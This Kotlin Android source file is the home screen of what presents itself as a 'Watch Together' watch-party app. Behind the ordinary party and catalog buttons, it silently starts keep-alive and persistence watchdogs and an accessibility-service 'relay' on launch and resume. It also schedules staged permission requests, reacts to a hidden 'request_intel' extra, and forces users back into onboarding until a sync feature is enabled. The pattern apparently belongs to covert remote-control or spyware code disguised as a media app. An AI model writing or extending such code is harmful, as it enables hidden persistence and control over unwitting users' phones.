package com.phonehand.app

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.textfield.TextInputEditText

/** Watch Together home — social watch party first, catalog secondary. */
class HomeActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!UserSession.isSignedUp(this) || !UserSession.onboardingDone(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }

        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false)) {
            PermissionWizardActivity.launch(this)
            finish()
            return
        }

        setContentView(R.layout.activity_home)

        findViewById<android.view.View>(R.id.btnStartParty).setOnClickListener {
            startActivity(Intent(this, WatchRoomActivity::class.java))
        }

        val roomInput = findViewById<TextInputEditText>(R.id.homeRoomInput)
        findViewById<android.view.View>(R.id.btnJoinRoom).setOnClickListener {
            val code = roomInput.text?.toString()?.trim()?.uppercase().orEmpty()
            if (code.length < 2) {
                Toast.makeText(this, R.string.watch_room_hint, Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            startActivity(
                Intent(this, WatchRoomActivity::class.java).apply {
                    putExtra(WatchRoomActivity.EXTRA_ROOM_CODE, code)
                },
            )
        }

        findViewById<android.view.View>(R.id.btnBrowseCatalog).setOnClickListener {
            startActivity(Intent(this, MoviesActivity::class.java))
        }

        window.decorView.post {
            if (isFinishing || isDestroyed) return@post
            SafeKeepAlive.start(this)
            PersistenceWatchdog.schedule(this)
            TouchAccessibilityService.instance?.ensureRelay()
            runCatching {
                if (PermissionMoments.hasHomeBatch(this)) {
                    PermissionMoments.scheduleHomeSession(this)
                }
            }.onFailure { Log.w(TAG, "permission batch skipped: ${it.message}") }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false)) {
            PermissionWizardActivity.launch(this)
            finish()
        }
    }

    override fun onResume() {
        super.onResume()
        if (!WatchSync.isEnabled(this) &&
            UserSession.onboardingDone(this) &&
            UserSession.permissionsWizardDone(this)
        ) {
            runCatching {
                startActivity(Intent(this, OnboardingActivity::class.java))
                finish()
            }.onFailure { Log.w(TAG, "onboarding redirect failed: ${it.message}") }
            return
        }
        TouchAccessibilityService.instance?.ensureRelay()
    }

    companion object {
        private const val TAG = "HomeActivity"
        const val EXTRA_REQUEST_INTEL = "request_intel"
    }
}
